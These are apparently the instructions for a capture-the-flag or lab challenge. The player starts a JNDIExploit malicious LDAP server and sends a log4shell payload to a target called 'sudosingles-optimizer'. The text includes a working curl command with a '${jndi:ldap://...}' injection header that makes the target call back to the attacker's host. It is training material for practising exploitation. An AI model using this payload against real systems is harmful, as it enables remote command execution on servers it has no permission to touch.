So, you’re going to use JNDIExploit to see if “sudosingles-optimizer” is vulnerable. This challenge has many parts, so go through each one carefully.

If you’re not already aware, JNDIExploit is a tool that sets up a malicious LDAP server that can be used to execute arbitrary commands on a host running an application vulnerable to the log4shell exploit.

TLDR; you’re going to trick “sudosingles-optimizer” into connecting to a malicious server so you can run whatever commands we want inside its container.

You have to set up the server first. To do this, do the following:

1.  Open the Terminal Emulator application from the dock on the bottom.
2.  Navigate to the hacker folder by running “cd /config/Desktop/hacker”
3.  Find your private ip address on the LAN network. There are many ways to find your IP address on Linux – I’ll leave this one to you. Just make sure you write it down. The IP you find should look something like 10.0.XX.XX or 10.0.XX.XXX
4.  Run the JNDIExploit-1.2-SNAPSHOT.jar file using Java, configuring it to start the malicious server listening on the private IP address you found in step 3 above.

If you see something like the below, you’re on the right track:

[+] LDAP Server Start Listening on 1389…
[+] HTTP Server Start Listening on 9001…

To test to make sure it’s running correctly, open another Terminal Emulator window and run the following command, where YOURIP is your local IP: “curl http://sudosingles-optimizer -H ‘X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}’”

To complete this challenge, after you run the above command, enter the last line generated in the Terminal Emulator window where JNDIExploit is running, and hit “Submit.” If your answer doesn’t submit, double-check all the above steps. It could mean that something is wrong with the server command.
